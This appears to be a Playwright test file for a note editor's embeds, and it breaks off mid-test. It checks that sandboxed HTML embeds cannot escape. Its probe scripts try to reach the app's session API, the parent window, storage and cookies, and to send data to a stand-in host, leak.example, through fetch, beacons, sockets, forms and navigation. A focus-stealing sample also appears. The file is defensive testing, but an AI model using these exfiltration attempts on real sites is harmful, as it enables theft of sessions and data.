import { expect, test, type Frame, type Page } from "@playwright/test";
import { perform, signInAsNewPerson } from "./helpers.ts";

let errors: string[];
test.beforeEach(({ page }) => {
  errors = [];
  page.on("pageerror", (err) => errors.push(err.message));
});
test.afterEach(() => expect(errors).toEqual([]));

const editor = (page: Page) => page.getByRole("textbox", { name: "Note text" });
const line = (page: Page, text: string) => page.locator(".cm-line").filter({ hasText: text });
const menu = (page: Page) => page.getByRole("listbox");
const below = (page: Page, embed: string) => page.locator(`.embed-below[data-embed="${embed}"]`);
/** The documents HTML embeds are running as, which have no address. */
const running = (page: Page) => page.frames().filter((f) => f.url() === "about:srcdoc");
const runHtml = (page: Page) => below(page, "html").getByRole("button", { name: "Run HTML" });
const settled = (page: Page) => page.evaluate(() => new Promise((done) => setTimeout(() => requestAnimationFrame(() => requestAnimationFrame(done)), 50)));

async function open(page: Page, text: string) {
  await signInAsNewPerson(page, "Ada Lovelace");
  const note = await perform(page, { type: "note.create", text });
  await page.goto(`/note/${note.id}`);
  await expect(editor(page)).toContainText(text.split("\n")[0]!.replace(/^# /, ""));
  await editor(page).focus();
  await page.keyboard.press("ControlOrMeta+Home");
  return note;
}

/** Puts the cursor on a line of the note, counted from 1, at its start or its end. */
async function goTo(page: Page, lineNumber: number, side: "Home" | "End" = "End") {
  await editor(page).focus();
  await page.keyboard.press("ControlOrMeta+Home");
  for (let i = 1; i < lineNumber; i++) await page.keyboard.press("ArrowDown");
  await page.keyboard.press(side);
}

const PLAYER = "https://www.youtube-nocookie.com/";

/**
 * Stands in for YouTube's player, which the tests can't count on reaching: a page that knows when it
 * was loaded and counts for as long as it lives. Returns how many times it has been asked for.
 */
async function standInPlayer(page: Page) {
  const asked: string[] = [];
  await page.route(`${PLAYER}**`, (route) => {
    asked.push(route.request().url());
    return route.fulfill({ contentType: "text/html", body: "<body>stand-in<script>window.born = String(Math.random()); window.ticks = 0; setInterval(() => window.ticks++, 20);</script>" });
  });
  return asked;
}

const player = (page: Page) => page.frames().find((f) => f.url().startsWith(PLAYER));
const playing = (frame: Frame) => frame.evaluate(() => ({ born: (window as unknown as { born: string }).born, ticks: (window as unknown as { ticks: number }).ticks }));

/** Marks the frame in `embed`'s element, and counts every time it or anything around it is taken out of the page or put into it from here on. */
const watch = (page: Page, embed: string) =>
  page.evaluate((name) => {
    const frame = document.querySelector(`.embed-below[data-embed="${name}"] iframe`) as HTMLIFrameElement & { marked?: boolean };
    frame.marked = true;
    const seen = window as unknown as { moves: number };
    seen.moves = 0;
    new MutationObserver((records) => {
      for (const record of records) for (const node of [...record.addedNodes, ...record.removedNodes]) if (node.contains(frame)) seen.moves++;
    }).observe(document, { childList: true, subtree: true });
  }, embed);

const kept = (page: Page, embed: string) =>
  page.evaluate((name) => {
    const frame = document.querySelector(`.embed-below[data-embed="${name}"] iframe`) as (HTMLIFrameElement & { marked?: boolean }) | null;
    return { same: frame?.marked === true, moves: (window as unknown as { moves: number }).moves };
  }, embed);

/** Where an embed's element is and where the room kept for it in the note is. They are the same place while the room is on screen. */
const placed = (page: Page, embed: string) =>
  page.evaluate((name) => {
    const box = (el: Element | null) => {
      const rect = el?.getBoundingClientRect();
      return rect ? [rect.left, rect.top, rect.width, rect.height].map(Math.round) : null;
    };
    const rooms = [...document.querySelectorAll(".embed-below-room > div")];
    const all = [...document.querySelectorAll(".embed-below")];
    const el = document.querySelector(`.embed-below[data-embed="${name}"]`);
    return { el: box(el), room: rooms.length === all.length ? box(rooms[all.indexOf(el!)] ?? null) : null };
  }, embed);

async function expectOverItsRoom(page: Page, embed: string, when: string) {
  await expect
    .poll(async () => {
      const { el, room } = await placed(page, embed);
      return el && room ? Math.max(...el.map((side, i) => Math.abs(side - room[i]!))) : Infinity;
    }, when)
    .toBeLessThanOrEqual(1);
}

// A video and a post are written as an address alone on a line now (media-address.spec.ts). These are the embeds notes used to
// write them with, which no menu offers and which are still drawn where a note has one.
for (const [typed, picked, written, address, shows] of [
  ["/you", "YouTube video", "::youtube{video address}", "https://youtu.be/dQw4w9WgXcQ", "Play video"],
  ["/soc", "Social post", "::social{post address}", "https://bsky.app/profile/did:plc:z72i7hdynmk6r22z27h6tvur/post/3l6oveex3ii2l", "Show post"],
] as const) {
  test(`${picked} written the old way is not in the embed menu, and still shows below its line without loading anything from the other site`, async ({ page, baseURL }) => {
    const outside: string[] = [];
    page.on("request", (request) => !request.url().startsWith(new URL(baseURL!).origin) && outside.push(request.url()));
    await open(page, "# Media\n\n");
    await page.keyboard.press("ControlOrMeta+End");
    await page.keyboard.type(typed, { delay: 20 });
    await settled(page);
    await expect(menu(page).getByRole("option", { name: picked })).toHaveCount(0);
    await page.keyboard.press("Escape");
    for (let i = 0; i < typed.length; i++) await page.keyboard.press("Backspace");
    const name = written.slice(2, written.indexOf("{"));
    await page.keyboard.type(`::${name}{${address}} and words after`);
    await expect(below(page, name).getByRole("button", { name: shows })).toBeVisible();
    await expect(line(page, "and words after")).toContainText(`::${name}{${address}}`);
    await page.keyboard.press("ControlOrMeta+Home");
    await expect(line(page, "and words after")).toHaveText(`${picked === "Social post" ? "Post on Bluesky" : picked} and words after`);
    await expect(below(page, name).getByRole("button", { name: shows })).toBeVisible();
    await expect(page.getByRole("status")).toHaveText("Saved");
    expect(outside).toEqual([]);
  });
}

test("a link card written the old way is not in the embed menu, and is still drawn from what the note says, with nothing fetched", async ({ page, baseURL }) => {
  const outside: string[] = [];
  page.on("request", (request) => !request.url().startsWith(new URL(baseURL!).origin) && outside.push(request.url()));
  await open(page, "# Media\n\n");
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type("/link", { delay: 20 });
  await settled(page);
  await expect(menu(page).getByRole("option", { name: "Link" })).toHaveCount(0);
  await page.keyboard.press("Escape");
  for (let i = 0; i < "/link".length; i++) await page.keyboard.press("Backspace");
  await page.keyboard.type("::link{https://example.com/docs The docs}");
  await page.keyboard.press("ControlOrMeta+Home");
  const card = editor(page).getByRole("link", { name: "The docs example.com" });
  await expect(card).toHaveAttribute("href", "https://example.com/docs");
  await expect(card).toHaveAttribute("target", "_blank");
  await expect(card).toHaveAttribute("rel", "noopener noreferrer");
  expect(outside).toEqual([]);
});

test("an address that isn't https, or isn't a video, is never made a link or a frame", async ({ page }) => {
  await open(page, "# Media\n\nOne ::link{javascript:alert(1) Click me} two ::youtube{https://evil.example/watch?v=dQw4w9WgXcQ} three ::social{https://example.com/a/status/1}\n\nlast\n");
  await expect(editor(page).locator(".embed-unread")).toHaveCount(3);
  await expect(editor(page).getByRole("link")).toHaveCount(0);
  await expect(page.locator(".embed-below")).toHaveCount(0);
  await expect(page.locator("iframe")).toHaveCount(0);
});

test("a playing video is never loaded again, stopped, or moved in the page by anything but a change to its own source", async ({ page }) => {
  test.slow();
  // Wide enough that the embed's line is one row as written, so Home and End are the ends of the line.
  await page.setViewportSize({ width: 1800, height: 900 });
  const asked = await standInPlayer(page);
  const filler = Array.from({ length: 400 }, (_, i) => `filler ${i}`).join("\n");
  const text = `# Video\n\nfirst above\nsecond above\n\nWatch ::youtube{https://youtu.be/dQw4w9WgXcQ} now\n\nfirst below\nsecond below\n\n${filler}\n`;
  const note = await open(page, text);

  await below(page, "youtube").getByRole("button", { name: "Play video" }).click();
  await expect.poll(() => player(page)?.url()).toBe(`${PLAYER}embed/dQw4w9WgXcQ?autoplay=1`);
  const frame = below(page, "youtube").locator("iframe");
  await expect(frame).toHaveAttribute("sandbox", "allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox allow-presentation");
  await expect(frame).toHaveAttribute("referrerpolicy", "strict-origin");
  const { born } = await playing(player(page)!);
  await watch(page, "youtube");

  let ticks = 0;
  const expectStillPlaying = async (when: string) => {
    await expect.poll(async () => (await playing(player(page)!)).ticks, `counting on ${when}`).toBeGreaterThan(ticks);
    const now = await playing(player(page)!);
    ticks = now.ticks;
    expect(now.born, `the same load ${when}`).toBe(born);
    expect(asked, `asked for once ${when}`).toHaveLength(1);
    expect(await kept(page, "youtube"), `the same element, never moved, ${when}`).toEqual({ same: true, moves: 0 });
  };
  await expectStillPlaying("after it started");

  await goTo(page, 3);
  await page.keyboard.type(" with words typed above");
  await expectStillPlaying("after typing above");
  await expectOverItsRoom(page, "youtube", "after typing above");

  await page.keyboard.type("\nnew line one\nnew line two\nnew line three");
  await expectStillPlaying("after lines were added above");
  await expectOverItsRoom(page, "youtube", "after lines were added above");

  await page.keyboard.press("Home");
  for (let i = 0; i < 2; i++) await page.keyboard.press("Shift+ArrowUp");
  await page.keyboard.press("Backspace");
  await expect(editor(page)).not.toContainText("new line two");
  await expectStillPlaying("after lines were removed above");
  await expectOverItsRoom(page, "youtube", "after lines were removed above");

  // The embed's own line: the cursor arriving shows it as written, and typing either side of the embed is not a change to it.
  await goTo(page, 7);
  await expect(line(page, "Watch")).toHaveText("Watch ::youtube{https://youtu.be/dQw4w9WgXcQ} now");
  await page.keyboard.type(" and then");
  await page.keyboard.press("Home");
  await page.keyboard.type("Come and ");
  await expect(line(page, "Watch")).toHaveText("Come and Watch ::youtube{https://youtu.be/dQw4w9WgXcQ} now and then");
  await expectStillPlaying("after typing on its own line");
  await expectOverItsRoom(page, "youtube", "after typing on its own line");

  await goTo(page, 9);
  await page.keyboard.type(" with words typed below\nand a line added below");
  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("Home");
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Backspace");
  await expect(editor(page)).not.toContainText("second below");
  await expectStillPlaying("after typing, adding and removing lines below");

  await page.keyboard.press("Enter");
  await page.keyboard.press("ArrowUp");
  await page.keyboard.type("Another ::youtube{https://youtu.be/aaaaaaaaaaa}");
  await expect(below(page, "youtube")).toHaveCount(2);
  await page.keyboard.press("Backspace");
  await page.keyboard.press("Backspace");
  await page.keyboard.type("b}");
  await expect(below(page, "youtube")).toHaveCount(2);
  await expectStillPlaying("after another embed was written and changed");

  await expect(page.getByRole("status")).toHaveText("Saved");
  const mine = await perform(page, { type: "note.read", id: note.id });
  await perform(page, { type: "note.write", id: note.id, baseRevision: mine.revision, text: mine.text.replace("# Video\n", "# Video\n\nA paragraph from somewhere else.\n").replace("first below", "first below, changed elsewhere") });
  await page.evaluate(() => window.dispatchEvent(new Event("focus")));
  await expect(editor(page)).toContainText("A paragraph from somewhere else.", { timeout: 30_000 });
  await expect(editor(page)).toContainText("first below, changed elsewhere");
  await expectStillPlaying("after someone else's change landed above and below");
  await expectOverItsRoom(page, "youtube", "after someone else's change landed");

  // Far out of sight the note no longer holds its room, and it goes on playing where the room will be again.
  await editor(page).focus();
  await page.keyboard.press("ControlOrMeta+End");
  await expect(page.locator(".embed-below-room")).toHaveCount(0);
  await page.keyboard.type("typed at the far end");
  await expectStillPlaying("while scrolled far away");
  await page.keyboard.press("ControlOrMeta+Home");
  await expect(page.locator(".embed-below-room")).toHaveCount(2);
  await expectStillPlaying("after scrolling back");
  await expectOverItsRoom(page, "youtube", "after scrolling back");

  // Its own source: the one thing that draws it again, once, in the element and the place it has.
  await page.evaluate(() => ((document.querySelector(".embed-below iframe")!.closest(".embed-below") as HTMLElement & { marked?: boolean }).marked = true));
  await goTo(page, 9, "Home");
  const written = "Come and Watch ::youtube{https://youtu.be/dQw4w9WgXcQ}";
  await expect(line(page, "Watch")).toContainText(written);
  for (let i = 0; i < written.length - 1; i++) await page.keyboard.press("ArrowRight");
  await expectOverItsRoom(page, "youtube", "with the cursor in its source");
  const boxBefore = (await placed(page, "youtube")).el;
  await page.keyboard.press("Shift+ArrowLeft");
  await page.keyboard.type("c");
  await expect(line(page, "Watch")).toContainText("::youtube{https://youtu.be/dQw4w9WgXcc}");
  await expect.poll(() => player(page)).toBeUndefined();
  const again = page.locator(".embed-below").first();
  expect(await again.evaluate((el: HTMLElement & { marked?: boolean }) => el.marked), "drawn again in the element it had").toBe(true);
  await expect.poll(async () => (await placed(page, "youtube")).el, "and in the place it had").toEqual(boxBefore);
  await expect(below(page, "youtube").getByRole("button", { name: "Play video" })).toHaveCount(2);
  expect(asked).toHaveLength(1);
  await again.getByRole("button", { name: "Play video" }).click();
  await expect.poll(() => player(page)?.url()).toBe(`${PLAYER}embed/dQw4w9WgXcc?autoplay=1`);
  expect(asked).toHaveLength(2);
});

test("nothing in the note moves when the cursor comes to a video's line, or when the video loads", async ({ page }) => {
  await standInPlayer(page);
  // Wide enough that each embed's line is one row as written, whatever the face: a line too long for the column wraps under the cursor.
  await page.setViewportSize({ width: 1800, height: 1400 });
  await open(page, "# Video\n\nbefore it\n\n::youtube{https://youtu.be/dQw4w9WgXcQ}\n\nbetween them\n\nSee ::youtube{https://youtu.be/aaaaaaaaaaa} here\n\nafter them\n");
  const measured = () =>
    page.evaluate(() => {
      const top = (el: Element) => Math.round(el.getBoundingClientRect().top * 10) / 10;
      const box = (el: Element) => {
        const rect = el.getBoundingClientRect();
        return [rect.left, rect.top, rect.width, rect.height].map((n) => Math.round(n * 10) / 10);
      };
      const lines = [...document.querySelectorAll(".cm-content .cm-line")];
      const see = lines.find((l) => l.textContent!.startsWith("See"))!;
      const range = document.createRange();
      range.setStart(document.createTreeWalker(see, NodeFilter.SHOW_TEXT).nextNode()!, 0);
      range.setEnd(range.startContainer, 1);
      return {
        lines: lines.map((l) => [top(l), Math.round(l.getBoundingClientRect().height * 10) / 10]),
        see: Math.round(range.getBoundingClientRect().left * 10) / 10,
        rooms: [...document.querySelectorAll(".embed-below-room > div")].map(box),
        shown: [...document.querySelectorAll(".embed-below")].map(box),
      };
    });
  await expect(below(page, "youtube")).toHaveCount(2);
  await expect.poll(async () => (await measured()).shown).toEqual((await measured()).rooms);
  const before = await measured();
  expect(before.rooms[0]![3], "a 16:9 box from the first moment").toBeCloseTo(before.rooms[0]![2]! * (9 / 16), 0);

  for (const lineNumber of [5, 9, 3, 11]) {
    await goTo(page, lineNumber);
    await settled(page);
    expect(await measured(), `with the cursor on line ${lineNumber}`).toEqual(before);
  }
  await goTo(page, 5);
  await expect(page.locator(".cm-line").nth(4)).toHaveText("::youtube{https://youtu.be/dQw4w9WgXcQ}");

  await below(page, "youtube").getByRole("button", { name: "Play video" }).first().click();
  await expect.poll(() => player(page)).toBeDefined();
  await expect(below(page, "youtube").first().locator("iframe")).toBeVisible();
  await settled(page);
  await goTo(page, 1);
  await settled(page);
  expect(await measured(), "after the video loaded").toEqual(before);
});

test("an HTML embed is picked from the embed menu, runs only when asked, and stays running while the note is written around it", async ({ page }) => {
  await open(page, "# Scene\n\nabove\n\n");
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type("/html", { delay: 20 });
  await expect(menu(page).getByRole("option", { name: "HTML" })).toBeVisible();
  await settled(page);
  await page.keyboard.press("Enter");
  await page.keyboard.type("after the block");

  // Until it is asked for there is no frame at all, in the room it will have.
  await expect(runHtml(page)).toBeVisible();
  await expect(page.locator("iframe")).toHaveCount(0);
  const room = (await placed(page, "html")).el;
  await runHtml(page).click();
  const framed = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");
  await expect(framed.getByText("Hello from HTML.")).toBeVisible();
  expect((await placed(page, "html")).el, "running, it is where its button was").toEqual(room);
  await expect(below(page, "html").locator("iframe")).toHaveAttribute("sandbox", "allow-scripts");
  await expect(below(page, "html").locator("iframe")).toHaveAttribute("src", "/embed-frame");

  // The block as written, with a counter in it. Its body changed, so what was running is gone and it asks again.
  await editor(page).getByRole("button", { name: "HTML" }).click();
  await expect(editor(page)).toContainText("<p>Hello from HTML.</p>");
  await page.keyboard.press("End");
  await page.keyboard.type("<script>window.born = String(Math.random()); window.ticks = 0; setInterval(() => window.ticks++, 20);</script>");
  await goTo(page, 3);
  await expect(editor(page).getByRole("button", { name: "HTML" })).toBeVisible();
  await expect(runHtml(page)).toBeVisible();
  await expect(page.locator("iframe")).toHaveCount(0);
  await runHtml(page).click();
  await expect.poll(async () => (await running(page)[0]?.evaluate(() => typeof (window as unknown as { ticks?: number }).ticks).catch(() => "")) ?? "").toBe("number");
  const { born } = await playing(running(page)[0]!);
  await watch(page, "html");
  await goTo(page, 3);

  let ticks = 0;
  const expectStillRunning = async (when: string) => {
    await expect.poll(async () => (await playing(running(page)[0]!)).ticks, `counting on ${when}`).toBeGreaterThan(ticks);
    const now = await playing(running(page)[0]!);
    ticks = now.ticks;
    expect(now.born, `the same load ${when}`).toBe(born);
    expect(await kept(page, "html"), `the same element, never moved, ${when}`).toEqual({ same: true, moves: 0 });
  };
  await page.keyboard.type(" and more\nand a new line");
  await expectStillRunning("after typing above");
  await expectOverItsRoom(page, "html", "after typing above");
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type(" and more\nand a new line");
  await expectStillRunning("after typing below");

  // The cursor going into the block shows it as written. Nothing of it changed, so the frame stays.
  await editor(page).getByRole("button", { name: "HTML" }).click();
  await expect(editor(page)).toContainText(":::html{}");
  await expectStillRunning("with the cursor in its block");
  await expectOverItsRoom(page, "html", "with the cursor in its block");
  await page.keyboard.press("ControlOrMeta+Home");
  await expectStillRunning("after the cursor left its block");
  await expectOverItsRoom(page, "html", "after the cursor left its block");
});

test("an HTML embed can't reach the app, the member's session, the browser's storage, or the network", async ({ page, baseURL }) => {
  const app = new URL(baseURL!).origin;
  // What got as far as the network: a request the page's policy stops is never handed on to be answered.
  const reached: string[] = [];
  const answered: string[] = [];
  page.on("response", (response) => response.frame() !== page.mainFrame() && answered.push(new URL(response.url()).pathname + new URL(response.url()).search));
  // Anything that did get out would be answered, so a probe that reports failure was stopped, not unlucky.
  await page.context().route("https://leak.example/**", (route) => {
    reached.push(route.request().url());
    return route.fulfill({ status: 200, contentType: "text/plain", headers: { "Access-Control-Allow-Origin": "*" }, body: "leaked" });
  });

  const probe = `<p id="out">probing</p>
<script>
(async () => {
  const found = {};
  const attempt = async (name, run) => {
    try { found[name] = String(await run()); } catch (err) { found[name] = "refused: " + (err && err.name); }
  };
  const loads = (make) => new Promise((ok, no) => { const el = make(); el.onload = () => ok("loaded"); el.onerror = () => no({ name: "error" }); document.body.append(el); });
  await attempt("origin", () => self.origin);
  await attempt("fetch the app", () => fetch("${app}/api/me", { credentials: "include" }).then((r) => r.status));
  await attempt("fetch the app without cors", () => fetch("${app}/api/me", { mode: "no-cors", credentials: "include" }).then((r) => r.type));
  await attempt("fetch another site", () => fetch("https://leak.example/fetch").then((r) => r.status));
  await attempt("xhr", () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open("GET", "https://leak.example/xhr"); x.onload = () => ok(x.status); x.onerror = () => no({ name: "error" }); x.send(); }));
  await attempt("beacon", () => navigator.sendBeacon("https://leak.example/beacon", "x"));
  await attempt("websocket", () => new Promise((ok, no) => { const ws = new WebSocket("wss://leak.example/ws"); ws.onopen = () => ok("open"); ws.onerror = () => no({ name: "error" }); }));
  await attempt("event source", () => new Promise((ok, no) => { const es = new EventSource("https://leak.example/events"); es.onopen = () => ok("open"); es.onerror = () => no({ name: "error" }); }));
  await attempt("image", () => loads(() => Object.assign(new Image(), { src: "https://leak.example/image.png" })));
  await attempt("script", () => loads(() => Object.assign(document.createElement("script"), { src: "https://leak.example/script.js" })));
  await attempt("stylesheet", () => loads(() => Object.assign(document.createElement("link"), { rel: "stylesheet", href: "https://leak.example/style.css" })));
  await attempt("frame", () => loads(() => Object.assign(document.createElement("iframe"), { src: "https://leak.example/frame" })).then(() => "made"));
  await attempt("font", () => new FontFace("leak", "url(https://leak.example/font.woff2)").load().then(() => "loaded"));
  await attempt("worker", () => new Promise((ok, no) => { const w = new Worker("https://leak.example/worker.js"); w.onerror = () => no({ name: "error" }); setTimeout(() => ok("started"), 300); }));
  await attempt("service worker", () => navigator.serviceWorker.register("${app}/sw.js").then(() => "registered"));
  await attempt("parent document", () => parent.document.title);
  await attempt("parent location", () => parent.location.href);
  await attempt("top location", () => top.location.href);
  await attempt("navigate the top window", () => { top.location = "https://leak.example/top"; return "navigated"; });
  await attempt("parent storage", () => parent.localStorage.length);
  await attempt("localStorage", () => localStorage.length);
  await attempt("sessionStorage", () => sessionStorage.length);
  await attempt("cookie", () => { document.cookie = "probe=1"; return "cookie:" + document.cookie; });
  await attempt("indexedDB", () => new Promise((ok, no) => { const open = indexedDB.open("probe"); open.onsuccess = () => ok("opened"); open.onerror = () => no({ name: "error" }); }));
  await attempt("caches", () => caches.open("probe").then(() => "opened"));
  await attempt("popup", () => (window.open("https://leak.example/popup") ? "opened" : "refused: null"));
  await attempt("history", () => { history.pushState({}, "", "#pushed"); return "pushed"; });
  await attempt("form", () => new Promise((ok) => {
    const form = document.createElement("form");
    form.action = "https://leak.example/form";
    form.method = "post";
    document.body.append(form);
    form.submit();
    setTimeout(() => ok("still here"), 300);
  }));
  window.found = found;
  document.getElementById("out").textContent = "probed";
})();
</script>`;
  await page.setViewportSize({ width: 1280, height: 1400 });
  const note = await open(page, `# Probe\n\n:::html{height=80}\n${probe}\n:::\n\nend\n`);

  // Opening the note ran nothing.
  await settled(page);
  expect(page.frames()).toHaveLength(1);
  const pages = await page.evaluate(() => history.length);
  await runHtml(page).click();
  const framed = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");
  await expect(framed.locator("#out")).toHaveText("probed", { timeout: 30_000 });
  const found = await running(page)[0]!.evaluate(() => (window as unknown as { found: Record<string, string> }).found);
  expect(found).toEqual({
    origin: "null",
    "fetch the app": "refused: TypeError",
    "fetch the app without cors": "refused: TypeError",
    "fetch another site": "refused: TypeError",
    xhr: "refused: error",
    // Taken to be sent later, and then never sent: nothing reaches the other site, below.
    beacon: "true",
    websocket: "refused: error",
    "event source": "refused: error",
    image: "refused: error",
    script: "refused: error",
    stylesheet: "refused: error",
    // The element is made and says it loaded. Nothing was asked for: see what reached the network, below.
    frame: "made",
    font: "refused: NetworkError",
    worker: "refused: SecurityError",
    "service worker": "refused: SecurityError",
    "parent document": "refused: SecurityError",
    "parent location": "refused: SecurityError",
    "top location": "refused: SecurityError",
    "navigate the top window": "refused: SecurityError",
    "parent storage": "refused: SecurityError",
    localStorage: "refused: SecurityError",
    sessionStorage: "refused: SecurityError",
    cookie: "refused: SecurityError",
    indexedDB: "refused: SecurityError",
    caches: "refused: SecurityError",
    popup: "refused: null",
    history: "refused: SecurityError",
    form: "still here",
  });
  expect(await page.evaluate(() => history.length), "it added nothing to what Back goes through").toBe(pages);

  await settled(page);
  expect(new URL(page.url()).origin, "the app's window was taken nowhere").toBe(app);
  expect(page.context().pages()).toHaveLength(1);
  expect(reached, "nothing reached another site").toEqual([]);
  expect([...new Set(answered)], "the app answered an embed with nothing but its own empty document").toEqual(["/embed-frame"]);
  // The member is still signed in, and the note is as it was.
  expect((await perform(page, { type: "note.read", id: note.id })).text).toContain("# Probe");
});

test("what is below a line is there, whole and in its place, in every frame painted: as the note loads, and as the note is written above it", async ({ page }) => {
  // What the note shows in each frame, read as the frame is laid out to be painted: after everything that
  // draws before a paint has run, and before any work for the next frame can. A box that changes size in
  // each frame is what gets the reading made then.
  await page.addInitScript(() => {
    const painted: unknown[] = [];
    (window as unknown as { painted: unknown[] }).painted = painted;
    const box = (el: Element) => {
      const rect = el.getBoundingClientRect();
      return [rect.left, rect.top, rect.width, rect.height].map(Math.round).join(" ");
    };
    const beat = document.createElement("div");
    beat.style.cssText = "position: fixed; top: 0; left: 0; height: 0; width: 1px; pointer-events: none";
    new ResizeObserver(() => {
      const content = document.querySelector(".cm-content");
      if (!content) return;
      painted.push({
        written: /::(youtube|social)\{|:::html/.test(content.textContent!),
        rooms: [...document.querySelectorAll(".embed-below-room > div")].map(box),
        shown: [...document.querySelectorAll(".embed-below")].map(box),
        filled: [...document.querySelectorAll(".embed-below-drawn")].every((el) => el.childElementCount > 0),
      });
    }).observe(beat);
    let wide = false;
    const each = () => {
      if (!beat.isConnected) document.documentElement.append(beat);
      beat.style.width = (wide = !wide) ? "2px" : "1px";
      requestAnimationFrame(each);
    };
    requestAnimationFrame(each);
  });
  const frames = () => page.evaluate(() => (window as unknown as { painted: { written: boolean; rooms: string[]; shown: string[]; filled: boolean }[] }).painted.splice(0));
  await page.setViewportSize({ width: 1280, height: 1400 });
  await open(page, "# Video\n\nabove\n\nSee ::youtube{https://youtu.be/dQw4w9WgXcQ} here\n\nand ::social{https://bsky.app/profile/did:plc:z72i7hdynmk6r22z27h6tvur/post/3l6oveex3ii2l}\n\n:::html{height=120}\n<p>Hello</p>\n:::\n\nafter\n");
  await expect(runHtml(page)).toBeVisible();
  await settled(page);

  const loading = await frames();
  expect(loading.length).toBeGreaterThan(2);
  const final = loading.at(-1)!;
  expect(final.rooms).toHaveLength(3);
  for (const frame of loading) expect(frame, "a frame painted while the note loaded").toEqual({ written: false, rooms: final.rooms, shown: final.rooms, filled: true });

  await goTo(page, 3);
  await frames();
  await page.keyboard.type(" and more\nline\nline\nline", { delay: 30 });
  await page.keyboard.press("Backspace");
  await page.keyboard.press("Backspace");
  await settled(page);
  const writing = await frames();
  expect(writing.length).toBeGreaterThan(5);
  expect(new Set(writing.map((f) => f.rooms.join())).size, "the rooms moved as lines came and went").toBeGreaterThan(2);
  for (const frame of writing) expect({ ...frame, shown: frame.shown }, "a frame painted while writing above").toEqual({ written: false, rooms: frame.rooms, shown: frame.rooms, filled: true });
});

test("an HTML embed can't send its frame, or any frame, anywhere: not to a site the app frames, not to the app, not by a link, a refresh or a form", async ({ page, baseURL }) => {
  const app = new URL(baseURL!).origin;
  const sites = ["https://www.youtube-nocookie.com", "https://platform.twitter.com", "https://embed.bsky.app", "https://leak.example"];
  // What got as far as the network, on the sites the app may frame and on the app itself.
  const reached: string[] = [];
  for (const site of sites) {
    await page.context().route(`${site}/**`, (route) => {
      reached.push(route.request().url());
      return route.fulfill({ status: 200, contentType: "text/html", body: "<title>reached</title>" });
    });
  }
  const asked: string[] = [];
  page.on("request", (request) => request.frame() !== page.mainFrame() && request.url().startsWith(app) && asked.push(request.url().slice(app.length)));

  const named = (name: string, body: string) => `:::html{height=60}\n<script>window.probe = ${JSON.stringify(name)};</script>${body}\n:::\n\n`;
  const later = (run: string) => `<script>setTimeout(() => { try { ${run}; window.did = "ran"; } catch (err) { window.did = "refused: " + err.name; } }, 200);</script>`;
  const embeds: [name: string, body: string][] = [
    ["to a site the app frames", later(`location.href = "https://www.youtube-nocookie.com/embed/x?leak=1"`)],
    ["to its own document's address", later(`location.href = ${JSON.stringify(`${app}/embed-frame?leak=2`)}`)],
    ["to the app", later(`location.href = ${JSON.stringify(`${app}/api/me?leak=3`)}`)],
    ["by a refresh", `<meta http-equiv="refresh" content="0; url=https://platform.twitter.com/embed/Tweet.html?leak=4">`],
    ["by a link", `<a id="a" href="https://embed.bsky.app/embed/leak?x=5">go</a>${later(`document.getElementById("a").click()`)}`],
    ["by a link to the top", `<a id="a" href="https://leak.example/top-link" target="_top">go</a>${later(`document.getElementById("a").click()`)}`],
    ["the frame around it", later(`parent.location.href = "https://www.youtube-nocookie.com/embed/x?leak=6"`)],
    ["the frame around it, by name", later(`window.open("https://www.youtube-nocookie.com/embed/x?leak=7", "_parent")`)],
    ["a frame inside it", `<iframe id="n"></iframe>${later(`document.getElementById("n").src = "https://www.youtube-nocookie.com/embed/y?leak=8"`)}`],
    ["a form", `<form id="f" action="https://leak.example/form" method="post" target="_top"><input name="x" value="9"></form>${later(`document.getElementById("f").submit()`)}`],
    ["hints", `<link rel="preconnect" href="https://leak.example/"><link rel="prefetch" href="https://leak.example/prefetch?x=10"><link rel="preload" as="fetch" href="https://leak.example/preload?x=11"><link rel="modulepreload" href="https://leak.example/module?x=12">${later("1")}`],
    ["a download", later(`const a = document.createElement("a"); a.href = "https://leak.example/download?x=13"; a.download = "x"; document.body.append(a); a.click()`)],
  ];
  await page.setViewportSize({ width: 1280, height: 2400 });
  await open(page, `# Leaving\n\n${embeds.map(([name, body]) => named(name, body)).join("")}end\n`);
  await expect(runHtml(page)).toHaveCount(embeds.length);
  for (let i = 0; i < embeds.length; i++) await runHtml(page).first().click();
  await expect(page.locator(".embed-below iframe")).toHaveCount(embeds.length);
  // Each has had its try: the ones still standing say so, and the ones that left are gone from their frames.
  await page.waitForTimeout(2500);

  const frames = page.frames().filter((f) => f !== page.mainFrame());
  expect(frames.map((f) => f.url()).filter((url) => !url.startsWith(`${app}/embed-frame`) && url !== "about:srcdoc" && url !== "about:blank" && !url.startsWith("chrome-error:")), "no frame is anywhere but its own document, or an error").toEqual([]);
  expect(frames.filter((f) => f.url().startsWith(`${app}/embed-frame`)).map((f) => f.url()), "the frames the app made are where it put them").toEqual(embeds.map(() => `${app}/embed-frame`));
  expect(reached, "nothing reached a site the app frames, or any other").toEqual([]);
  expect([...new Set(asked)], "the app was asked for nothing but the empty document, as the app asked for it").toEqual(["/embed-frame"]);
  expect(new URL(page.url()).origin).toBe(app);
  expect(page.context().pages()).toHaveLength(1);
});

const STEALS = `<input id="i" autofocus><script>setInterval(() => { try { window.focus(); document.getElementById("i").focus(); } catch (err) {} }, 30);</script>`;
const stopped = (page: Page) => page.locator(".embed-below").getByRole("alert");
const read = async (page: Page, id: string) => (await perform(page, { type: "note.read", id })).text;

test("an HTML embed that takes the keyboard is stopped before a key reaches it, and what the member types stays in the note", async ({ page }) => {
  const note = await open(page, `# Typing\n\n:::html{height=80}\n${STEALS}\n:::\n\nend line\n`);
  // Opening the note runs nothing, so nothing can take the keyboard.
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type("typed before it ran. ", { delay: 20 });
  await expect(page.locator("iframe")).toHaveCount(0);
  await expect.poll(() => read(page, note.id)).toContain("typed before it ran. ");

  await runHtml(page).click();
  await expect(stopped(page)).toContainText("HTML was stopped: it tried to take the keyboard while you were typing.");
  await expect(page.locator("iframe")).toHaveCount(0);
